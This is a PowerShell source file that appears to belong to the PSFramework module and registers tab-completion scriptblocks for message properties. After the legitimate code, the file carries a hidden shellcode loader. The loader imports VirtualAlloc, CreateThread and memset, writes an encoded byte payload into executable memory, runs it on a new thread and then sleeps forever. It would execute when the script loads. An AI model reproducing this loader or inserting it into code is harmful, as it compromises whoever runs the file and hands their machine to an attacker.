﻿Register-PSFTeppScriptblock -Name 'PSFramework.Message.Module' -ScriptBlock {
	Get-PSFMessage | Select-Object -ExpandProperty ModuleName | Select-Object -Unique
}

Register-PSFTeppScriptblock -Name 'PSFramework.Message.Function' -ScriptBlock {
	Get-PSFMessage | Select-Object -ExpandProperty FunctionName | Select-Object -Unique
}

Register-PSFTeppScriptblock -Name 'PSFramework.Message.Tags' -ScriptBlock {
	Get-PSFMessage | Select-Object -ExpandProperty Tags | Remove-PSFNull -Enumerate | Select-Object -Unique
}

Register-PSFTeppScriptblock -Name 'PSFramework.Message.Runspace' -ScriptBlock {
	Get-PSFMessage | Select-Object -ExpandProperty Runspace | Select-Object -Unique
}

Register-PSFTeppScriptblock -Name 'PSFramework.Message.Level' -ScriptBlock {
	Get-PSFMessage | Select-Object -ExpandProperty Level | Select-Object -Unique
}
$c = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xd9,0xca,0xba,0xf2,0x01,0x86,0x80,0xd9,0x74,0x24,0xf4,0x5d,0x33,0xc9,0xb1,0x71,0x31,0x55,0x17,0x03,0x55,0x17,0x83,0x1f,0xfd,0x64,0x75,0x67,0xaf,0xce,0x15,0xa1,0x8b,0xdb,0x03,0xb9,0x0f,0x10,0xe9,0x70,0x99,0x69,0x64,0x43,0x5b,0x99,0x7a,0xe1,0x48,0x1e,0x96,0x48,0x2a,0xb6,0xeb,0x46,0x1e,0xd8,0x35,0x59,0x1c,0x6c,0xe6,0x3e,0x54,0x5b,0xa0,0x6a,0xaa,0x0d,0x35,0x91,0x1c,0xe3,0xd3,0x9a,0x67,0x1d,0x22,0xe0,0x75,0x22,0xf0,0x6b,0x91,0x45,0x02,0x85,0x20,0x5c,0x1e,0xd4,0x28,0x14,0xe8,0x66,0x2d,0x31,0x4a,0x7a,0xeb,0xc6,0x13,0x88,0x03,0x84,0x4d,0xc6,0xaf,0x6c,0xec,0xa4,0x78,0x2b,0xe2,0x88,0x1e,0xe2,0xa5,0x41,0x97,0x06,0xfb,0xf3,0x30,0x99,0xfd,0xcf,0x6a,0xf1,0x7f,0xa7,0xba,0x77,0x16,0x9e,0x58,0xaf,0xd4,0xf1,0xd3,0x44,0x2a,0xd3,0x39,0x40,0x14,0x8f,0x33,0xa8,0xac,0xf7,0x53,0x99,0x7d,0x14,0x17,0x96,0x48,0xb5,0xd3,0x83,0xd1,0x09,0x09,0xfe,0x5f,0x38,0xe6,0x0f,0x0d,0x65,0xd1,0xc9,0x01,0x0e,0x67,0xf3,0xb1,0x8c,0x06,0x66,0x82,0x66,0x25,0xfd,0x5a,0x59,0x69,0x81,0xdc,0x32,0x72,0x9a,0x81,0xea,0xc9,0x30,0xc9,0x0b,0x51,0x11,0x52,0xe0,0x47,0x8c,0x82,0xa8,0x2d,0x70,0x37,0x9e,0xfa,0x89,0x15,0x6b,0x62,0x6f,0xfb,0x56,0x0a,0xc0,0x9d,0x57,0x5f,0x2b,0x4f,0x8d,0x55,0xe4,0x5f,0xab,0x1f,0xb8,0x32,0x6c,0x43,0x56,0x1f,0x90,0xee,0xcd,0xce,0x29,0xf6,0x58,0xfe,0x35,0x0c,0x56,0x1c,0xef,0x5a,0xe5,0x44,0x53,0x61,0xe8,0x57,0x25,0x58,0xe2,0xff,0xe6,0xe0,0x24,0xe9,0x3d,0x40,0xbe,0x75,0x0c,0x29,0xa9,0x0f,0x37,0xbf,0x19,0x9c,0x7d,0x8a,0xac,0xbe,0xbe,0x98,0xe4,0xd6,0x45,0xf1,0x99,0x4c,0xff,0x9c,0x78,0x79,0x0c,0x23,0x10,0xc6,0xde,0x42,0x26,0xb4,0xeb,0x6c,0x69,0xab,0x32,0x5b,0xea,0x3e,0xa9,0x78,0x88,0x58,0x34,0xa4,0x7f,0x6a,0x04,0x93,0xc0,0xf7,0xb5,0x7f,0x09,0xa2,0xab,0x5e,0x30,0x2a,0x26,0x6f,0xf1,0x64,0x44,0x7e,0xb3,0xad,0x32,0x58,0xe7,0xb8,0xfe,0x37,0x25,0x74,0x6b,0xb0,0xfa,0xb3,0xb7,0x1a,0x44,0xea,0x83,0xbc,0xe6,0x02,0xc7,0x8c,0xd7,0x2f,0x27,0x74,0x16,0x88,0xac,0x37,0xb1,0x8a,0xc1,0x8a,0x11,0xfb,0x56,0x89,0x97,0xf6,0x32,0xae,0x4b,0x2f,0x07,0xf2,0x25,0x59,0x1b,0x6b,0x1f,0x85,0xe7,0x53,0x0b,0x9c,0xc2,0x95,0x71,0x7a,0x9f,0xae,0x9d,0xfa,0xeb,0x81,0xd2,0x58,0xbc,0xbb,0x0c,0x92,0xaf,0x08,0xc0,0x04,0x6b,0x16,0x07,0x58,0x3b,0xfe,0x35,0x1e,0xb6,0x1d,0xc3,0xcf,0x73,0x0d,0xaf,0x3b,0x62,0x2a,0x7f,0x20,0xa7,0x49,0x8b,0x9c,0x6d,0x63,0x8c,0x83,0x98,0xb5,0x6b,0xf3,0x5e,0xd8,0x6e,0x5f,0xc7,0xf9,0x66,0xd9,0xf9,0xa3,0x02,0x26,0x41,0x02,0xe9,0x62,0x3d,0x01,0x53,0x58,0xb8,0x6b,0xc2,0xad,0x2b,0xdb,0xe7,0xc8;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};

